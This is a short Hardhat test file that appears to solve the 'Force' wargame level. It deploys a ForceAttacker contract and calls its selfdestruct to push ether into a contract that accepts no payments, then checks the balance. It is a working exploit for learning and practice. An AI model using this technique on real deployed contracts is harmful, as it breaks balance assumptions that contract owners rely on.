import { expect } from "chai";
import { ethers } from "hardhat";

describe("Force", async function () {

  it("Should increase the balance", async function () {
    //+setup
    const [deployer, attacker] = await ethers.getSigners()
    const Force = await ethers.getContractFactory("Force");
    const force = await Force.deploy();
    await force.deployed();
    //-setup

    //1. Deploy ForceAttacker
    const ForceAttacker = await ethers.getContractFactory("ForceAttacker");
    const forceAttacker = await ForceAttacker.connect(attacker).deploy();
    await forceAttacker.deployed();

    // await attacker.sendTransaction({ to: force.address, value: ethers.utils.parseEther("0.01") })

    //2.Call callSelfdestruct to force ether into the Force address
    await forceAttacker.callSelfdestruct(force.address, { value: ethers.utils.parseEther("0.01") })

    expect(await ethers.provider.getBalance(force.address)).to.gt(0)

  });
});